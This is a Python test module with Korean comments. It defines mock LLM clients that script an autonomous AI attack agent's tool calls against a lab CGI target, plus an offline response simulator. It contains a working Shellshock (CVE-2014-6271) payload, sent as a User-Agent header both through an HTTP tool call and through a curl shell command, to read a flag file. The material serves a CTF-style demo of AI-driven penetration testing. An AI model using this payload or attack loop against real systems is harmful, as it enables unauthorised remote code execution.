"""
Mock LLM - API 키 없이 Tool Use 루프를 테스트하기 위한 가짜 Anthropic 클라이언트.

실제 Anthropic 클라이언트의 `client.messages.create(...)` 인터페이스를 흉내내,
미리 짜인 시나리오대로 http_request 툴을 호출하는 응답을 돌려준다.
AutonomousAttackBot(client=MockAnthropic()) 형태로 주입해 사용한다.

목적: 졸업프로젝트 데모/검증. "AI가 정찰→공격→플래그"하는 전체 파이프라인을
0원으로 재현한다. (LLM의 *자율 판단*만 대체할 뿐, 스캐너/HTTP/로그 등 나머지
실제 코드 경로는 그대로 실행된다.)
"""

# Shellshock 페이로드: bash 함수 정의 뒤에 명령을 붙여 CGI 실행 시 트리거.
SHELLSHOCK_UA = "() { :; }; echo; echo; /bin/cat /tmp/flag.txt"


class _Block:
    """anthropic 응답의 content 블록(text / tool_use)을 흉내낸다."""
    def __init__(self, type, text=None, id=None, name=None, input=None):
        self.type = type
        self.text = text
        self.id = id
        self.name = name
        self.input = input


class _Response:
    """anthropic messages.create() 반환 객체를 흉내낸다."""
    def __init__(self, content, stop_reason):
        self.content = content
        self.stop_reason = stop_reason


class _MockMessages:
    def __init__(self, outer):
        self._outer = outer

    def create(self, **kwargs):
        return self._outer._next(kwargs)


class MockAnthropic:
    """정해진 시나리오대로 tool_use를 반환하는 가짜 클라이언트.

    시나리오(Shellshock):
      1턴: /victim.cgi 정상 응답 확인 (정찰)
      2턴: /victim.cgi 의 User-Agent에 Shellshock 페이로드 주입 (공격) -> 플래그
      3턴 이후: 종료(end_turn)
    """
    def __init__(self, target_path="/victim.cgi"):
        self.messages = _MockMessages(self)
        self.calls = 0
        self.target_path = target_path

    def _next(self, kwargs):
        self.calls += 1

        if self.calls == 1:
            return _Response([
                _Block("text",
                       text=f"discovered_paths에 {self.target_path} 가 보인다. 먼저 정상 응답을 확인한다."),
                _Block("tool_use", id="probe_1", name="http_request",
                       input={"method": "GET", "url_path": self.target_path}),
            ], "tool_use")

        if self.calls == 2:
            return _Response([
                _Block("text",
                       text="200 OK, CGI 스크립트다. Shellshock(CVE-2014-6271) 의심 "
                            "-> User-Agent 헤더에 페이로드를 주입한다."),
                _Block("tool_use", id="attack_1", name="http_request",
                       input={"method": "GET", "url_path": self.target_path,
                              "headers": {"User-Agent": SHELLSHOCK_UA}}),
            ], "tool_use")

        return _Response([
            _Block("text", text="더 시도할 행동이 없다. 종료한다."),
        ], "end_turn")


class MockAnthropicShell:
    """run_command(쉘) 툴을 구동하는 가짜 클라이언트.

    시나리오: 공격자 쉘에서 curl로 타겟을 정찰 -> Shellshock 페이로드를 담은
    curl로 타겟 RCE를 트리거해 /tmp/flag.txt 를 읽어온다.
    """
    def __init__(self, target="http://aibb-shellshock"):
        self.messages = _MockMessages(self)
        self.calls = 0
        self.target = target.rstrip("/")

    def _next(self, kwargs):
        self.calls += 1

        if self.calls == 1:
            return _Response([
                _Block("text", text="공격자 쉘에서 curl로 타겟 경로를 정찰한다."),
                _Block("tool_use", id="cmd_1", name="run_command",
                       input={"command": f"curl -s -i {self.target}/victim.cgi | head -n 15"}),
            ], "tool_use")

        if self.calls == 2:
            # 유효한 Shellshock 페이로드(단일 중괄호). ua는 일반 문자열이라 그대로 둔다.
            ua = "() { :; }; echo; echo; /bin/cat /tmp/flag.txt"
            cmd = f"curl -s -A '{ua}' {self.target}/victim.cgi"
            return _Response([
                _Block("text", text="CGI 확인. Shellshock(CVE-2014-6271) 의심 "
                                    "-> User-Agent에 페이로드를 담아 RCE로 flag를 읽는다."),
                _Block("tool_use", id="cmd_2", name="run_command",
                       input={"command": cmd}),
            ], "tool_use")

        return _Response([
            _Block("text", text="플래그 확보 또는 더 시도할 행동 없음. 종료한다."),
        ], "end_turn")


def mock_execute_attack(base_url, payload):
    """오프라인 모드용 HTTP 시뮬레이터.

    실제 docker 타겟 없이도 루프를 돌릴 수 있게, victim.cgi에 Shellshock
    페이로드가 오면 플래그를, 아니면 평범한 응답을 돌려준다. AutonomousAttackBot
    인스턴스의 execute_attack를 이 함수로 교체(monkeypatch)해 사용한다.
    """
    path = payload.get("url_path", "/")
    headers = payload.get("headers", {}) or {}
    header_blob = " ".join(str(v) for v in headers.values())

    if path != "/victim.cgi":
        return {"status": 404, "headers": {"Content-Type": "text/html"},
                "body": "<html><body>Not Found</body></html>", "body_truncated": False}

    # Shellshock 트리거 패턴 감지
    if "() {" in header_blob:
        return {"status": 200, "headers": {"Content-Type": "text/html"},
                "body": "FLAG{shellshock_rce_2024}\n<html><body>Hello world</body></html>",
                "body_truncated": False}

    return {"status": 200, "headers": {"Content-Type": "text/html"},
            "body": "<html><body>Hello world</body></html>", "body_truncated": False}
